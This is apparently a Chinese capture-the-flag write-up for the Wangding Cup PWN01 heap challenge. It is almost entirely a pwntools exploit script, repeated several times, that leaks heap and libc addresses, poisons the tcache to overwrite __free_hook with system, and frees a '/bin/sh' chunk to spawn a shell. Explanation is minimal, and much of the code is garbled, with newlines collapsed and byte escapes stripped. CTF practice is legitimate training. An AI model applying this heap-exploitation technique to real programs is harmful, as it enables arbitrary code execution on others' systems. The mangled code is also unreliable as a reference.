# web选手入门pwn(20) ——网鼎杯PWN01

> 原文: https://www.ctfiot.com/213214.html
> ID: 213214

#!/usr/bin/env python from pwn import * context.log_level = "debug"#sh = process("./pwn")sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()add(0x4f8)add(0xf8)free(0)show(1)sh.interactive()

add(0x4f8)add(0xf8)free(0)show(1608)

add(0x4f8)#c0add(0xf8)#c1free(0)show(1608)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))free(1)add(0xf8,p64(heap_N-1520))#c2show(1768)

add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)

add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))

add(0x98)#c6free(6)free(1)free(3)

edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700

free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunk

add(0x98,"/bin/shx00") #c8

add(0x98) #c9

add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10

最后free前面写了/bin/sh的堆块即可getshellfree(8)

#!/usr/bin/env python from pwn import * context.log_level = "debug"sh = process("./pwn")#sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()
add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))
add(0x98)#c6free(6)free(1)free(3)
edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700
free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunkadd(0x98,"/bin/shx00") #c8add(0x98) #c9add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10
free(8)sh.interactive()


```
#!/usr/bin/env python from pwn import * context.log_level = "debug"#sh = process("./pwn")sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()add(0x4f8)add(0xf8)free(0)show(1)sh.interactive()
```



```
add(0x4f8)add(0xf8)free(0)show(1608)
```



```
add(0x4f8)#c0add(0xf8)#c1free(0)show(1608)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))free(1)add(0xf8,p64(heap_N-1520))#c2show(1768)
```



```
add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)
```



```
add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))
```



```
add(0x98)#c6free(6)free(1)free(3)
```



```
edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700
```



```
free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunk
```



```
add(0x98,"/bin/shx00") #c8
```



```
add(0x98) #c9
```



```
add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10
```



```
最后free前面写了/bin/sh的堆块即可getshellfree(8)
```



```
#!/usr/bin/env python from pwn import * context.log_level = "debug"sh = process("./pwn")#sh = gdb.debug("./pwn","b show_chunk n c")
libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")libc_malloc_hook = libc.sym['__malloc_hook']libc_system = libc.sym['system']libc_free_hook = libc.sym['__free_hook']libc_main_arena = libc_malloc_hook + 0x10libc_main_arena_N = libc_malloc_hook + 0x70print(hex(libc_main_arena_N))#0x555555558060 ptr

def add(size, content="AAAAAAAA"): sh.recvuntil("choice") sh.sendline("1") sh.recvuntil("Size :") sh.sendline(str(size)) sh.recvuntil("Content :") sh.send(content) def free(index): sh.recvuntil("choice") sh.sendline("2") sh.recvuntil("Index :") sh.sendline(str(index))
def edit(addr): sh.recvuntil("choice") sh.sendline("3") sh.recvuntil("content :") sh.sendline(p64(addr))
def show(index): sh.recvuntil("choice") sh.sendline("4") sh.recvuntil("Index :") sh.sendline(str(index)) return sh.recvline()
add(0x4f8)#c0add(0x98)#c1add(0x4f8)#c2add(0x98)#c3free(0)free(2)add(0x4f8)#c4add(0x4f8)#c5show(4)heap_N = u64(sh.recvuntil("x55x55x55x55")[-6:]+"x00x00")#heap_N = u64(sh.recvuntil("x55")[-6:]+"x00x00")print(hex(heap_N))show(5)addr_main_arena_N = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = addr_main_arena_N - libc_main_arena_Nprint(hex(libc_base))
add(0x98)#c6free(6)free(1)free(3)
edit(heap_N+0x50d) #0x55555555bd3d to 0x55555555b700
free(4)add(0x4f8,"A"*0x460+p64(libc_free_hook+libc_base-8))#c7 make fake chunkadd(0x98,"/bin/shx00") #c8add(0x98) #c9add(0x98,p64(libc_system+libc_base)+p64(libc_system+libc_base)) #c10
free(8)sh.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/7-1730541920.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1730541920.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1730541921.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1730541921.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1730541921.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1730541922.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1730541922.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/4-1730541923.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1730541923.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1730541923.png)